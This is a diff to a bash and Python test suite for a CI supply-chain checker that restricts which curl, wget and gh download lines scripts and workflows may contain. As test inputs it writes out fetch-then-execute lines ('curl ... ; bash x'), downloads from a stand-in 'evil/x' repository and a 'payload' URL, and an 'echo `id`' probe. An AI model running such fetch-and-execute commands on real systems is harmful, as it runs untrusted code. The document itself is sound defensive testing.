@@ -1988,6 +1988,15 @@ PY
 # --- REQ-SUP-001-AC19 (AC19', the literal design; advisor step 5, Oct 11): ruled INPUT FETCHES. A row of the BASE branch's unmeasured_input_fetch names the
 # line (AC16's key, line hash and count), its enclosing block (context: a .sh file's sha256, or a workflow or action step as canonical JSON), the literal host
 # (or repo:self), one literal verifier line and a test case. No grammar: the reviewers of the rows read the lines; the check guarantees none of it changes. --
+# AC19'' (advisor step 5, Oct 11, AC19 positive list): (0) a row binds only a line in one of the listed plain forms; any other form is refused, whatever it
+# does, a cosign verifier included; (2)/(3) the ruled line AND the verifier line are matched against PHYSICAL lines of a literal run: block, never parsed values.
+# FLIPPED by AC19'' (each was green before; each now expects the stricter result):
+#   - "AC19' (6) control: a wget line with a cosign verify-blob verifier line ... passes: exit 0" -> exit 1 (wget is not a listed form: OPEN-3 ruling)
+#   - PYC3 PLAIN 'r = subprocess.run(["curl", "-fsS", "-o", "a[0].tgz", U])' -> OTHER (a bracket in a curl argument: curl's URL globbing)
+#   - PYC4 PLAIN 'curl --retry 3 --connect-timeout 5 ...', 'curl --compressed --create-dirs --cacert ca.pem ...', 'curl --limit-rate 1M ...' -> OTHER
+#     (options not on the curl option list: -f -s -S -L -o FILE -O --fail --silent --show-error --location --output FILE --retry N --max-time N)
+#   - PYC5 PLAIN 'out = subprocess.check_output(["curl", "-fsS", U]).decode()' -> OTHER (the whole line: nothing after the call's ))
+#   message only (exit 1 unchanged): the (6) loops that grep 'redirect' now accept 'listed plain form' for the lines (0) refuses before (6) is read
 cat >"$work/if.py" <<'PY'
 import hashlib, json, os, pathlib, re, shutil, subprocess, sys, yaml
 VL = os.environ.get("VL", "")
@@ -2246,7 +2255,7 @@ for L in 'curl -L -o "$tmp/i" https://packages.example.dev/os/i' 'curl --locatio
          'curl -Lfsg -o "$tmp/i" https://packages.example.dev/os/i' '    r = subprocess.run(["curl", "-fsSL", "-o", part, "https://packages.example.dev/os/i"], stdout=sys.stderr)'; do
   one ifr "$FETCH$L"$'\n' "$L"
   CASE="AC19' (6): the redirect-following line $L with a checksum verifier line fails: exit 1"
-  refused 0; check grep -q 'redirect' "$work/if.out"
+  refused 0; check grep -qE 'redirect|listed plain form' "$work/if.out"
 done
 RL='curl -fsSL -o "$tmp/i" https://packages.example.dev/os/i'
 rcase() { # VERIFIER-LINE EXPECTED-RC WHY
@@ -2268,13 +2277,13 @@ for L in 'curl -4fsSL -o "$tmp/i" https://packages.example.dev/a.tgz' 'curl -6L 
          'wget -q -O "$tmp/i" https://packages.example.dev/a.tgz' '    r = subprocess.run(["wget", "-q", "-O", part, "https://packages.example.dev/a.tgz"], stdout=sys.stderr)'; do
   one ifr2 "$FETCH$L"$'\n' "$L"
   CASE="AC19' (6): $L follows redirects (a single-dash word holding L, --location*, or wget) and a checksum verifier line fails: exit 1"
-  refused 0; check grep -q 'redirect' "$work/if.out"
+  refused 0; check grep -qE 'redirect|listed plain form' "$work/if.out"
 done
 WL='wget -q -O "$tmp/i" https://packages.example.dev/os/i'
 ifrepo ifwg "${SUPPORT[@]}" head bin/fetch.sh "$FETCH$WL"$'\n' head bin/verify.sh $'#!/bin/bash\n'"$COS"$'\n'
 ifx "$work/if-1.json" plain "$(ifrow "$work/ifwg" bin/fetch.sh "$WL" "$HOSTN" "{\"verifier\": {\"file\": \"bin/verify.sh\", \"line\": $(python3 -c 'import json,sys;print(json.dumps(sys.argv[1]))' "$COS")}}")"; ifck ifwg "$work/if-1.json"
-CASE="AC19' (6) control: a wget line with a cosign verify-blob verifier line carrying identity and issuer passes: exit 0"
-check test "$rc" -eq 0
+CASE="AC19'' (0) FLIPPED (was the (6) control, exit 0): a wget line with a cosign verify-blob verifier line is not a listed plain form: exit 1"
+refused 0; check grep -q 'listed plain form' "$work/if.out"
 # Sonnet residual 1: U+0085, U+2028 and U+2029 (line breaks to YAML 1.1, not to the line split) are refused like a carriage return
 for c in 0085 2028 2029; do
   one ifu "$FETCH$LIT"$'\n'"# a$(python3 -c "import sys; sys.stdout.write(chr(0x$c))")b"$'\n' "$LIT"
@@ -2306,7 +2315,7 @@ for L in 'wget.exe -q -O "$tmp/i" https://packages.example.dev/a.tgz' '/usr/bin/
          '    r = subprocess.run(["curl", b"-L", "-fsS", "-o", part, "https://packages.example.dev/a.tgz"], stdout=sys.stderr)'; do
   one ifr3 "$FETCH$L"$'\n' "$L"
   CASE="AC19' (6) Codex P2: $L is not the bare curl, so it counts as following redirects and a checksum verifier line fails: exit 1"
-  refused 0; check grep -q 'redirect' "$work/if.out"
+  refused 0; check grep -qE 'redirect|listed plain form' "$work/if.out"
 done
 PYC='    r = subprocess.run(["curl", "-fsS", "-o", part, "https://packages.example.dev/a.tgz"], stdout=sys.stderr)'
 one ifr4 "$FETCH$PYC"$'\n' "$PYC"
@@ -2364,7 +2373,7 @@ for L in '    r = subprocess.run([TOOLS[["curl"][0]], "https://packages.example.
          '    r = subprocess.run(["curl"][0:1] + ["-fsS", "-o", part, "https://packages.example.dev/a.tgz"])'; do
   one ifr5 "$FETCH$L"$'\n' "$L"
   CASE="AC19' (6) Codex round 3 P2: $L (curl inside a subscript or a sliced list) counts as following redirects; a checksum verifier line fails: exit 1"
-  refused 0; check grep -q 'redirect' "$work/if.out"
+  refused 0; check grep -qE 'redirect|listed plain form' "$work/if.out"
 done
 CASE="AC19' (6) Codex round 3 P2: nested, subscript, slice, comprehension and attribute shapes all count as following redirects; the plain forms do not"
 check python3 - "$chk" <<'PYC3'
@@ -2373,8 +2382,9 @@ spec = importlib.util.spec_from_file_location("ac", sys.argv[1]); ac = importlib
 U = '"https://h.example.dev/a"'
 PLAIN = ['curl -fsS -o x https://h.example.dev/a', 'if curl -fsS -o x https://h.example.dev/a; then ok=1; fi', 'export X=1; curl -fsS https://h.example.dev/a',
          'for u in a b; do curl -fsS -o x https://h.example.dev/a; done', 'curl -fsS -o "$tmp/i" "https://h.example.dev/os/${arch}/APKINDEX.tar.gz"',
-         'r = subprocess.run(["curl", "-fsS", %s], stdout=sys.stderr)' % U, 'r = subprocess.run(["curl", "-fsS", "-o", "a[0].tgz", %s])' % U]
-OTHER = ['r = subprocess.run(["curl", "-fsS", %s],' % U, 'return ["curl", "-fsS", %s]' % U,      # round 4 (fail closed): an unclosed call, a returned,
+         'r = subprocess.run(["curl", "-fsS", %s], stdout=sys.stderr)' % U]
+OTHER = ['r = subprocess.run(["curl", "-fsS", "-o", "a[0].tgz", %s])' % U,   # FLIPPED by AC19'' (PLAIN before): a bracket in a curl argument
+         'r = subprocess.run(["curl", "-fsS", %s],' % U, 'return ["curl", "-fsS", %s]' % U,      # round 4 (fail closed): an unclosed call, a returned,
          'cmd = ["curl", "-fsS", %s]' % U, 'r = run([["curl", "-fsS", %s]])' % U, 'r = run(x, ["curl", "-fsS", %s])' % U,   # assigned or nested list
          'r = subprocess.run([TOOLS[["curl"][0]], %s])' % U,                     # the reproducer
          'r = subprocess.run([TOOLS[ ["curl"][0] ], %s])' % U, 'r = subprocess.run([TOOLS [ ["curl"] [0] ], %s])' % U,
@@ -2407,10 +2417,10 @@ check python3 - "$chk" <<'PYC4'
 import importlib.util, sys
 spec = importlib.util.spec_from_file_location("ac", sys.argv[1]); ac = importlib.util.module_from_spec(spec); spec.loader.exec_module(ac)
 U = '"https://h.example.dev/a"'
-PLAIN = ['curl --fail --silent --show-error --output x https://h.example.dev/a', 'curl --retry 3 --connect-timeout 5 -o x https://h.example.dev/a',
+PLAIN = ['curl --fail --silent --show-error --output x https://h.example.dev/a', 'r = subprocess.run(["curl", "--fail", %s], check=True)' % U]
+OTHER = ['curl --retry 3 --connect-timeout 5 -o x https://h.example.dev/a',     # FLIPPED by AC19'' (PLAIN before): options not on the curl option list
          'curl --compressed --create-dirs --cacert ca.pem -o x https://h.example.dev/a', 'curl --limit-rate 1M -o x https://h.example.dev/a',
-         'r = subprocess.run(["curl", "--fail", %s], check=True)' % U]
-OTHER = ['r = run(args=["curl", "--fail", %s])' % U, 'x = (["curl", "-fsS", %s])' % U, 'r = run(["curl", "-fsS", %s], check=True)' % U,   # round 4: not subprocess
+         'r = run(args=["curl", "--fail", %s])' % U, 'x = (["curl", "-fsS", %s])' % U, 'r = run(["curl", "-fsS", %s], check=True)' % U,   # round 4: not subprocess
          'ok = cmd == ["curl", %s]' % U, 'cmd += ["curl", %s]' % U, 'if (cmd := ["curl", %s]): run(cmd)' % U, 'ok = cmd != ["curl", %s]' % U,
          'r = subprocess.run(["curl", f"{T["x"]}", %s])' % U, 'r = subprocess.run([f"{x}", "curl", %s])' % U, 'r = subprocess.run(["curl", rf"{a}", %s])' % U,
          'r = subprocess.run(["curl", t"{a}", %s])' % U, 'r = subprocess.run(["curl", F"x", %s])' % U,
@@ -2436,12 +2446,12 @@ PYC4
 A1L='    r = subprocess.run(["curl", "-fsS", "-o", part, "https://packages.example.dev/a.tgz"]'
 one ifr8 "$FETCH$A1L"$'\n''        + ["-L"])'$'\n' "$A1L"
 CASE="AC19' (6) Codex round 4 A1: a subprocess call continued on the next line (+ [\"-L\"])) counts as following redirects; a checksum verifier line fails: exit 1"
-refused 0; check grep -q 'redirect' "$work/if.out"
+refused 0; check grep -qE 'redirect|listed plain form' "$work/if.out"
 for L in '    return (["curl", "https://packages.example.dev/a.tgz"],)[0]' 'if curl - 1: run(T[0], "https://packages.example.dev/a.tgz")' \
          'curl -fsS -o x https://packages.example.dev/a.tgz --fol; echo done' 'curl --lo"cation" -fsS -o x https://packages.example.dev/a.tgz'; do
   one ifr8 "$FETCH$L"$'\n' "$L"
   CASE="AC19' (6) Codex round 4: $L counts as following redirects; a checksum verifier line fails: exit 1"
-  refused 0; check grep -q 'redirect' "$work/if.out"
+  refused 0; check grep -qE 'redirect|listed plain form' "$work/if.out"
 done
 CASE="AC19' (6) Codex round 4: unclosed calls, keyword parentheses, Python subtraction, glued separators and unresolved option words follow redirects"
 check python3 - "$chk" <<'PYC5'
@@ -2451,9 +2461,9 @@ U = '"https://h.example.dev/a"'
 PLAIN = ['curl -fsS -o x https://h.example.dev/a', 'curl -fsS https://h.example.dev/a; echo done', 'curl -fsS https://h.example.dev/a || exit 1',
          'curl -fsS -o "$tmp/i" "https://h.example.dev/os/${arch}/a"', 'curl -fsS --output "$out" https://h.example.dev/a && echo ok',
          "curl -fsS -o 'a b' https://h.example.dev/a", 'r = subprocess.run(["curl", "-fsS", "-o", part, %s], stdout=sys.stderr)' % U,
-         'subprocess.check_call(["curl", "--fail", %s])' % U, 'r = subprocess.run(["curl", "-fsS", %s], check=True, timeout=30)' % U,
-         'out = subprocess.check_output(["curl", "-fsS", %s]).decode()' % U]
-OTHER = ['r = subprocess.run(["curl", %s]' % U, 'r = subprocess.run(["curl", %s],' % U, 'r = subprocess.run(["curl", %s], stdout=x,' % U,   # A1
+         'subprocess.check_call(["curl", "--fail", %s])' % U, 'r = subprocess.run(["curl", "-fsS", %s], check=True, timeout=30)' % U]
+OTHER = ['out = subprocess.check_output(["curl", "-fsS", %s]).decode()' % U,   # FLIPPED by AC19'' (PLAIN before): the whole line, nothing after the call
+'r = subprocess.run(["curl", %s]' % U, 'r = subprocess.run(["curl", %s],' % U, 'r = subprocess.run(["curl", %s], stdout=x,' % U,   # A1
          'return (["curl", %s],)[0]' % U, 'if (["curl"],)[0]: run(T[0], %s)' % U, 'x = not (["curl", %s],)[0]' % U,                         # B2
          'r = subprocess.run(x, ["curl", %s])' % U, 'cmd.extend(["curl", %s])' % U, 'r = subprocess.run(["curl", %s], executable=E)' % U,
          'r = subprocess.run(["curl", %s], **kw)' % U, 'r = subprocess.run(["curl", p, %s])' % U, 'r = subprocess.run(["curl", %s, f(x)])' % U,
@@ -2505,6 +2515,183 @@ ifrepo ifb1k "${SUPPORT[@]}" head .github/workflows/f.yml "$(wfs "      - name: 
 ifx "$work/if-b1k.json" plain "$(ifrow "$work/ifb1k" .github/workflows/f.yml "$L4W" "$HOSTN")"; ifck ifb1k "$work/if-b1k.json"
 CASE="AC19' (2) Codex round 4 B1 control: the same line in a literal block run: |- passes: exit 0"
 check test "$rc" -eq 0
+# --- AC19'' (advisor step 5, Oct 11, AC19 positive list; Codex A round 5 and B round 4 at ad20e16) ------------------------------------------------------
+# (0) a row binds only a line in one of the listed plain forms; any other form is refused, whatever it does: a cosign verifier does not admit it.
+# plainrefused LINE WHY: the line with a checksum verifier line AND with a cosign verifier line: exit 1 both, refused by (0)
+plainrefused() {
+  one ifp0 "$FETCH$1"$'\n' "$1"
+  CASE="AC19'' (0): $2 ($1) with a checksum verifier line: exit 1, not a listed plain form"
+  refused 0; check grep -q 'listed plain form' "$work/if.out"
+  ifrepo ifp0c "${SUPPORT[@]}" head bin/fetch.sh "$FETCH$1"$'\n' head bin/verify.sh $'#!/bin/bash\n'"$COS"$'\n'
+  ifx "$work/if-1.json" plain "$(ifrow "$work/ifp0c" bin/fetch.sh "$1" "$HOSTN" "{\"verifier\": {\"file\": \"bin/verify.sh\", \"line\": $(python3 -c 'import json,sys;print(json.dumps(sys.argv[1]))' "$COS")}}")"; ifck ifp0c "$work/if-1.json"
+  CASE="AC19'' (0): $2 ($1) with a cosign verify-blob verifier line: exit 1, not a listed plain form"
+  refused 0; check grep -q 'listed plain form' "$work/if.out"
+}
+U0='https://packages.example.dev/os/i'
+plainrefused "/usr/bin/curl -fsS -o \"\$tmp/i\" $U0" 'P2 a curl path'
+plainrefused "curl.exe -fsS -o \"\$tmp/i\" $U0" 'P2 curl.exe'
+plainrefused "curl-impersonate -fsS -o \"\$tmp/i\" $U0" 'P2 curl-impersonate'
+plainrefused "    r = subprocess.run([b\"curl\", \"-fsS\", \"-o\", part, \"$U0\"], stdout=sys.stderr)" 'P3 b"curl"'
+plainrefused "    r = subprocess.run(['curl', '-fsS', '-o', part, '$U0'], stdout=sys.stderr)" "P3 'curl'"
+plainrefused "    r = subprocess.run([TOOLS[\"curl\"], \"-fsS\", \"-o\", part, \"$U0\"], stdout=sys.stderr)" 'P3 TOOLS["curl"]'
+plainrefused "    r = subprocess.run([\"curl\", \"-fsS\", \"-o\", part, \"$U0\"]," 'P3 a call left open on the line'
+plainrefused "curl -fsSLo\"\$out\" $U0" 'P4 a quote inside an option word'
+plainrefused "curl \"\$opt\" $U0" 'P5 an expansion as an option'
+plainrefused "curl -fsS $U0 > f" 'P5 a redirection'
+plainrefused "echo wget; curl -fsS -o \"\$tmp/i\" $U0" 'P6 a downloader word that is not plain elsewhere on the line'
+plainrefused "curl -fsS ~ $U0" 'Codex A5 P2 an unquoted ~ (HOME=-L makes it -L)'
+plainrefused "curl -fsS -o ~/i $U0" 'Codex A5 P2 an unquoted ~ in an output path'
+plainrefused "curl --expand-config opts.cfg $U0" 'Codex B4 P2 --expand-config'
+plainrefused "    r = subprocess.run([\"curl\", \"--expand-config\", \"opts.cfg\", \"$U0\"])" 'Codex B4 P2 --expand-config in the list'
+plainrefused "curl --expand-url x $U0" 'an --expand- option'
+plainrefused "curl -K cfg $U0" 'a config file'
+plainrefused "curl --proto =https -fsS -o \"\$tmp/i\" $U0" 'an option not on the curl option list'
+plainrefused "curl -fsSg -o \"\$tmp/i\" $U0" 'a short option not on the curl option list'
+plainrefused "curl -fsS -o \"\$tmp/i\" $U0; bash \$f" 'OPEN-2 an unquoted $ word after ;'
+plainrefused "curl -fsS -o \"\$tmp/i\" $U0 && echo ~" 'OPEN-2 an unquoted ~ after &&'
+plainrefused "curl -fsS -o \"\$tmp/i\" $U0; rm -f *.tmp" 'OPEN-2 a glob after ;'
+plainrefused "curl -fsS -o \"\$tmp/i\" $U0?v=1" 'a ? glob in an unquoted address'
+plainrefused "curl -fsS -o \"\$tmp/i\" \"https://packages.example.dev/os/{i,j}\"" "a brace in a quoted address (curl's URL globbing)"
+plainrefused "    r = subprocess.run([\"curl\", \"-fsS\", \"https://packages.example.dev/os/[1-2]\"])" 'a bracket in a list address'
+plainrefused "curl -fsS -o \"\$tmp/i\" $U0 &&" 'a line ending in && (continued on the next line)'
+plainrefused "    r = obj. subprocess.run([\"curl\", \"-fsS\", \"$U0\"])" 'Codex B4 info: an attribute-qualified callee across a space'
+plainrefused "    out = subprocess.check_output([\"curl\", \"-fsS\", \"$U0\"]).decode()" 'the whole line: text after the call'
+# (0) controls: listed forms stay green
+ifrepo ifp0k "${SUPPORT[@]}" head bin/fetch.sh "$FETCH"'curl -fsSLO "https://packages.example.dev/os/i"'$'\n' head bin/verify.sh $'#!/bin/bash\n'"$COS"$'\n'
+ifx "$work/if-1.json" plain "$(ifrow "$work/ifp0k" bin/fetch.sh 'curl -fsSLO "https://packages.example.dev/os/i"' "$HOSTN" "{\"verifier\": {\"file\": \"bin/verify.sh\", \"line\": $(python3 -c 'import json,sys;print(json.dumps(sys.argv[1]))' "$COS")}}")"; ifck ifp0k "$work/if-1.json"
+CASE="AC19'' (0) control: curl -fsSLO (listed, follows redirects) with a cosign verifier line passes: exit 0"
+check test "$rc" -eq 0
+for L in "curl --fail --silent --show-error --retry 3 --max-time 30 --output \"\$tmp/i\" $U0" "curl -fsS -o \"\$tmp/i\" $U0; bash \"\$tmp/i\"" "curl -fsS -o f $U0; bash f"; do
+  one ifp0p "$FETCH$L"$'\n' "$L"
+  CASE="AC19'' (0) control: $L (every word plain) with a checksum verifier line passes: exit 0"
+  check test "$rc" -eq 0
+done
+# OPEN-1 (repo:self): -R and --repo (and any abbreviation) after the prefix are refused by name; the rest of the line is held to the plain words
+for L in "$GHD -R evil/x" "$GHD --repo evil/x" "$GHD --rep evil/x" "$GHD --r evil/x" "$GHD --repo=evil/x" "$GHD -Revil/x" "$GHD -R=evil/x" "$GHD -pR x" \
+         "$GHD; bash \$x" "$GHD > f" "$GHD -D ~/d"; do
+  one ifg1 "$FETCH$L"$'\n' "$L" repo:self
+  CASE="AC19'' (0) OPEN-1: the repo:self line $L: exit 1, not a listed plain form"
+  refused 0; check grep -q 'listed plain form' "$work/if.out"
+done
+CASE="AC19'' (0): the listed plain forms, unit (whole line, every word positively plain; the curl option list; the repo:self names)"
+check python3 - "$chk" <<'PYC6'
+import importlib.util, sys
+spec = importlib.util.spec_from_file_location("ac", sys.argv[1]); ac = importlib.util.module_from_spec(spec); spec.loader.exec_module(ac)
+U = '"https://h.example.dev/a"'
+LISTED = ['curl -fsS -o x https://h.example.dev/a', 'curl -fsSL -o x https://h.example.dev/a', 'curl -fsSLO https://h.example.dev/a', 'curl -O https://h.example.dev/a',
+          'curl --fail --silent --show-error --location --retry 3 --max-time 30 --output x https://h.example.dev/a', 'curl -fsS -o x https://h.example.dev/a; bash x',
+          'if curl -fsS -o x https://h.example.dev/a; then ok=1; break; fi', 'curl -fsS -o "$tmp/i" "https://h.example.dev/os/${arch}/a"', 'curl -fsS https://h.example.dev/a || exit 1',
+          "curl -fsS -o 'a b' https://h.example.dev/a", 'curl -fsS https://h.example.dev/a;', 'for u in a b; do curl -fsS -o x https://h.example.dev/a; done',
+          'r = subprocess.run(["curl", "-fsSL", "-o", part, %s], stdout=sys.stderr)' % U, 'subprocess.check_call(["curl", "--fail", %s])' % U,
+          'r = subprocess.run(["curl", "--retry", "3", %s], check=True)' % U, 'r = subprocess.run([ "curl" , "-fsS", %s])' % U]
+UNLISTED = ['curl -fsS ~ https://h.example.dev/a', 'curl -fsS -o ~/x https://h.example.dev/a', 'curl -fsS https://h.example.dev/a; echo ~', 'curl -fsS https://h.example.dev/~a',
+            'curl -fsS -o x https://h.example.dev/a; bash $x', 'curl -fsS -o x https://h.example.dev/a && echo $HOME', 'curl -fsS -o x https://h.example.dev/a; echo `id`',
+            'curl -fsS "https://h.example.dev/{a,b}"', "curl -fsS 'https://h.example.dev/[1-2]'", 'curl -fsS -o x https://h.example.dev/a; [ -s x ]',
+            'curl -fsS -o x https://h.example.dev/a && { echo; }', 'curl -fsS https://h.example.dev/a 2>&1', 'curl -fsS https://h.example.dev/a < in',
+            'curl -fsS -o x https://h.example.dev/a?b', 'curl -fsS -o x https://h.example.dev/a; rm *.tmp', 'curl -fsS -o x https://h.example.dev/a; ls [ab]',
+            'curl --expand-config c https://h.example.dev/a', 'curl --expand-url x https://h.example.dev/a', 'curl -K c https://h.example.dev/a', 'curl --config c https://h.example.dev/a',
+            'curl --proto =https https://h.example.dev/a', 'curl --connect-timeout 5 https://h.example.dev/a', 'curl -fsSg https://h.example.dev/a', 'curl -4fsSL https://h.example.dev/a',
+            'curl --location-trusted https://h.example.dev/a', 'curl --retry x https://h.example.dev/a', 'curl --retry=3 https://h.example.dev/a', 'curl --output=x https://h.example.dev/a',
+            'curl -o -L https://h.example.dev/a', 'curl -o', 'curl --max-time 1e3 https://h.example.dev/a', 'curl -fsS https://h.example.dev/a &&', 'curl -fsS https://h.example.dev/a |',
+            'curl -fsS https://h.example.dev/a & echo', 'curl -fsS https://h.example.dev/a # c', 'curl -fsS https://h.example.dev/a\x01', 'CURL_HOME=x curl -fsS https://h.example.dev/a',
+            'curl -fsS https://h.example.dev/curl/a', 'curl -fsS "$U"', 'wget https://h.example.dev/a', '; curl -fsS https://h.example.dev/a',
+            'r = subprocess.run(["curl", "--expand-config", "c", %s])' % U, 'r = subprocess.run(["curl", "-K", "c", %s])' % U, 'r = subprocess.run(["curl", "-o"])',
+            'out = subprocess.check_output(["curl", "-fsS", %s]).decode()' % U, 'r = obj. subprocess.run(["curl", %s])' % U, 'x.y = subprocess.run(["curl", %s])' % U,
+            'r = subprocess.run(["curl", %s]) or 1' % U, 'r = subprocess.run(["curl", "https://h.example.dev/[1-2]"])', 'r = subprocess.run(["curl", "--connect-timeout", "5", %s])' % U,
+            'r = subprocess.run(["curl", "-o", "-L", %s])' % U, 'r = subprocess.run(["curl", %s]) # c' % U]
+GHD = 'gh release download "$ver" --repo "$GITHUB_REPOSITORY"'
+GH_LISTED = [GHD, GHD + ' -p manifest.json -D dist', GHD + ' --pattern "*.json" --dir dist', GHD + ' -D "$out"', GHD + ' --clobber']
+GH_UNLISTED = [GHD + ' -R evil/x', GHD + ' --repo evil/x', GHD + ' --rep evil/x', GHD + ' --r evil/x', GHD + ' --repo=evil/x', GHD + ' -Revil/x', GHD + ' -R=evil/x',
+               GHD + ' -pR x', GHD + '; bash $x', GHD + ' > f', GHD + ' -D ~/d', GHD + ' -p *.json', GHD + ' "-R" x', GHD + 'x', 'gh release download "$tag" --repo "$GITHUB_REPOSITORY"']
+bad = []
+for line in LISTED + UNLISTED:
+    flat = " ".join(line.split())
+    why = ac._unlisted(flat)
+    if (why is None) != (line in LISTED):
+        bad.append(("host", line, why))
+    if line in UNLISTED and not ac._follows_redirects(flat):
+        bad.append(("an unlisted line must count as following redirects", line))
+for line in GH_LISTED + GH_UNLISTED:
+    why = ac._unlisted(line, repo_self=True)
+    if (why is None) != (line in GH_LISTED):
+        bad.append(("repo:self", line, why))
+assert not bad, bad
+PYC6
+# (3) the verifier line is matched against PHYSICAL lines of a literal-block run: (|, |-, |+) of exactly one step, never a parsed value (outbox 4a R1-R6)
+VC='cosign verify-blob --bundle b --certificate-identity x --certificate-oidc-issuer https://i out'
+vwcase() { # FILE TEXT EXPECTED-RC WHY
+  ifrepo ifvp "${SUPPORT[@]}" head bin/fetch.sh "$FETCH$LIT"$'\n' head "$1" "$2"
+  ifx "$work/if-1.json" plain "$(ifrow "$work/ifvp" bin/fetch.sh "$LIT" "$HOSTN" "{\"verifier\": {\"file\": \"$1\", \"line\": \"$VC\"}}")"; ifck ifvp "$work/if-1.json"
+  CASE="AC19'' (3) physical verifier line: $4: exit $3"
+  check test "$rc" -eq "$3"; [ "$3" -eq 0 ] || check grep -q 'verifier' "$work/if.out"
+}
+GS="      - uses: actions/github-script@0000000000000000000000000000000000000000"$'\n'"        with:"$'\n'"          script: |"
+vwcase .github/workflows/v.yml "$(wfs "      - run: >"$'\n'"          cosign verify-blob --bundle b"$'\n'"          --certificate-identity x --certificate-oidc-issuer https://i out")"$'\n' 1 'R1 a folded run: > splitting the command over two physical lines'
+vwcase .github/workflows/v.yml "$(wfs "      - run: >"$'\n'"          $VC")"$'\n' 1 'R1b a folded run: > holding the line as one physical line'
+vwcase .github/workflows/v.yml "$(wfs "      - run: \"echo a\\n$VC\"")"$'\n' 1 'R2 a double-quoted run: with a \n escape'
+vwcase .github/workflows/v.yml "$(wfs "      - run: \"\\x63osign verify-blob --bundle b --certificate-identity x --certificate-oidc-issuer https://i out\"")"$'\n' 1 'R3 a \x63 escape (the file differs from the row)'
+vwcase .github/workflows/v.yml "$(wfs "      - run: cosign verify-blob --bundle b"$'\n'"          --certificate-identity x --certificate-oidc-issuer https://i out")"$'\n' 1 'R4 a multi-line plain scalar run:'
+vwcase .github/workflows/v.yml "$(wfs "      - run: $VC")"$'\n' 1 'R4b an inline plain run:'
+vwcase .github/workflows/v.yml "$(wfs "      - run: |"$'\n'"          $VC"$'\n'"$GS"$'\n'"            $VC")"$'\n' 1 'R5 a literal-block copy plus a physical copy in with: script: |'
+vwcase .github/workflows/v.yml "env:"$'\n'"  X: |"$'\n'"    $VC"$'\n'"$(wfs "      - run: |"$'\n'"          $VC")"$'\n' 1 'R6 a literal-block copy plus a physical copy in a top-level env: |'
+vwcase .github/workflows/v.yml "$(wfs "      - run: |"$'\n'"          $VC"$'\n'"      - run: |"$'\n'"          $VC")"$'\n' 1 'the line in the literal blocks of two steps'
+vwcase .github/workflows/v.yml "$(wfs "      - run: |-"$'\n'"          $VC")"$'\n' 0 'control: run: |-'
+vwcase .github/workflows/v.yml "$(wfs "      - run: |+"$'\n'"          $VC"$'\n')"$'\n' 0 'control: run: |+'
+vwcase .github/workflows/v.yml "$(wfs "      - run: |2"$'\n'"          $VC")"$'\n' 0 'control: run: |2 (an indentation indicator)'
+vwcase .github/actions/v/action.yml "name: v"$'\n'"runs:"$'\n'"  using: composite"$'\n'"  steps:"$'\n'"    - shell: bash"$'\n'"      run: |"$'\n'"        $VC"$'\n' 0 "control: an action's runs.steps[i].run: |"
+# Codex A round 5 P1: a download in an action.yml or action.yaml OUTSIDE .github/ is scanned like one under .github/ (the scan reads the tree reader's files)
+LACT=$'name: f\nruns:\n  using: composite\n  steps:\n    - shell: bash\n      run: |\n        echo hi\n'
+for f in action.yml tools/fetch/action.yml tools/fetch/action.yaml; do
+  ifrepo ifa5 "${SUPPORT[@]}" base "$f" "$LACT" head "$f" "$LACT        curl -fsS https://files.example.test/payload"$'\n'
+  ifx "$work/if-none.json" plain; ifck ifa5 "$work/if-none.json"
+  CASE="AC19'' Codex A5 P1: a download added to the existing local action $f (outside .github/) is refused: exit 1, never 'no pin moved'"
+  check test "$rc" -eq 1; check grep -q "FAIL unmeasured:$f" "$work/if.out"; check test "$(grep -c 'no pin moved' "$work/if.out")" -eq 0
+done
+ifrepo ifa5k "${SUPPORT[@]}" base action.yml "$LACT" head action.yml "$LACT        $LIT"$'\n'
+ifx "$work/if-1.json" plain "$(ifrow "$work/ifa5k" action.yml "$LIT" "$HOSTN")"; ifck ifa5k "$work/if-1.json"
+CASE="AC19'' Codex A5 P1 control: a ruled fetch in the root action.yml with its row passes: exit 0"
+check test "$rc" -eq 0
+CASE="AC19'' Codex A5 P1: the download scan reads exactly the tree reader's files (action.yml anywhere); a file outside that set is refused, never skipped"
+check python3 - "$chk" <<'PY'
+import importlib.util, sys
+spec = importlib.util.spec_from_file_location("ac", sys.argv[1]); ac = importlib.util.module_from_spec(spec); spec.loader.exec_module(ac)
+for p in ("action.yml", "a/action.yaml", "a/b/c/action.yml", ".github/actions/x/action.yml", "bin/x.sh", ".github/workflows/w.yml"):
+    occ = [k for k, f, b in ac.inv.unmeasured_occurrences({p: "x: |\n  curl -fsS https://h.example.dev/a\n"}) if k[1] == "a download"]
+    assert len(occ) == 1, (p, occ)
+    assert ac.inv.wanted(p), p
+for p in ("docs/x.md", "src/a.py"):
+    try:
+        list(ac.inv.unmeasured_occurrences({p: "curl -fsS https://h.example.dev/a\n"}))
+    except RuntimeError:
+        pass
+    else:
+        raise AssertionError(("a file the tree reader does not include was scanned or skipped silently", p))
+PY
+# Codex A round 5 P3 and B round 4 P3: --print-context refuses a line the checker would give an 'unruled:' hash (a vertical tab, a form feed, a
+# continuation-joined copy), a control character, and a line in no listed plain form: exit 2, nothing on stdout
+pcref() { # NAME LINE COUNT WHY FILE-LINES...
+  local n=$1 l=$2 c=$3 why=$4; shift 4; mkdir -p "$work/pcr-$n/bin"; printf '%s\n' '#!/bin/bash' "$@" >"$work/pcr-$n/bin/x.sh"
+  rc=0; out=$(cd "$work/pcr-$n" && python3 "$chk" --print-context bin/x.sh "$l" "$c" 2>"$work/pc.err") || rc=$?
+  CASE="AC19'' --print-context: $why: exit 2, nothing on stdout"
+  check test "$rc" -eq 2; check test -z "$out"
+}
+P5L='curl -fsS -o x https://h.example.dev/a'
+pcref vt "$P5L" 1 'Codex A5 P3 a .sh curl line ending in a vertical tab' "$P5L"$'\v'
+pcref ff "$P5L" 1 'a form feed inside the line' "${P5L/ -o/$'\f'-o}"
+pcref nb "$P5L" 1 'a no-break space inside the line' "${P5L/ -o/$'\xc2\xa0'-o}"
+pcref c1 "$P5L"$'\x01' 1 'a control character in the line' "$P5L"$'\x01'
+pcref b4 "$P5L" 2 'Codex B4 P3 one plain copy, an echo-continued copy and a continuation-joined copy' "$P5L" 'echo \' "$P5L" 'curl -fsS \' '-o x https://h.example.dev/a'
+pcref wg 'wget -q -O x https://h.example.dev/a' 1 'a wget line (not a listed plain form)' 'wget -q -O x https://h.example.dev/a'
+pcref ex 'curl --expand-config c https://h.example.dev/a' 1 'an --expand-config line (not a listed plain form)' 'curl --expand-config c https://h.example.dev/a'
